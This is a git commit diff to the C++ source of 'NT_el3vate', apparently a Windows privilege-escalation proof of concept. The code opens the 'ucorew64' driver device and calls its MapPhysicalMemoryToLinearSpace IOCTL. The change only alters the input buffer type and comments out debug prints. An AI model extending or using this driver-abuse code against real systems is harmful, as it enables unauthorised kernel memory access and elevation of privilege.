68fbd4caacd02149a2a5ff52a8e4dfec36df1dee
vnescape <vnescape@protonmail.com>
2022-11-01 21:16:27 +0100

    Use char array as input buffer

--- NT_el3vate/main.cpp
+++ NT_el3vate/main.cpp
@@ -20,7 +20,7 @@ int main(char argc, char** argv)
     HANDLE device = INVALID_HANDLE_VALUE;
     NTSTATUS status = FALSE;
     DWORD bytesReturned = 0;
-    struct_buffer inBuffer = { 0 };
+    char inBuffer[64] = {0};
     CHAR outBuffer[64] = { 0 };
 
     device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
@@ -32,16 +32,18 @@ int main(char argc, char** argv)
     }
 
     printf("[ ] Calling MapPhysicalMemoryToLinearSpace 0x%X\n", MapPhysicalMemoryToLinearSpace);
-    status = DeviceIoControl(device, MapPhysicalMemoryToLinearSpace, &inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
+    status = DeviceIoControl(device, MapPhysicalMemoryToLinearSpace, inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
     if (status != STATUS_SUCCESS) {
         printf("[!] MapPhysicalMemoryToLinearSpace failed with %X\n", status);
         return EXIT_FAILURE;
     }
     printf("[*] MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", MapPhysicalMemoryToLinearSpace);
     printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", outBuffer[0], bytesReturned);
-
+    /*
     printf("[*] inBuffer PhysicalBaseAddress: %p\n", inBuffer.PhysicalBaseAddress);
     printf("[*] inBuffer SectionHandle: %p\n", inBuffer.SectionHandle);
+    */
+
 
     system("pause");
 
